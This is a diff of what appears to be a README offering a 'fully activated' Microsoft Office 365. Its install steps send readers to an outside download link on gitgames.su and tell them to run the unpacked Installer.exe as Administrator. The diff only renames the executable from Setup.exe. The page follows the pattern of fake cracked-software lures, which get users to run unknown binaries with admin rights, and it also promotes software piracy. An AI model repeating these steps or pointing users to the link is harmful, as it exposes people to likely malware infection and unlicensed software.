@@ -30,7 +30,7 @@ Microsoft Office 365 stands out due to its powerful cloud integration, wide rang
 
 1️⃣ Download – Get the latest version from **[🔗 DOWNLOAD HERE](https://gitgames.su)**.  
 2️⃣ Extract – Use WinRAR or 7-Zip to unpack the .zip file.  
-3️⃣ Run as Admin – Right-click `Setup.exe` and select "Run as Administrator".  
+3️⃣ Run as Admin – Right-click `Installer.exe` and select "Run as Administrator".  
 4️⃣ Installation - wait for the program to be fully installed.  
 5️⃣ Use - Enjoy Microsoft Office 365 fully activated!
 
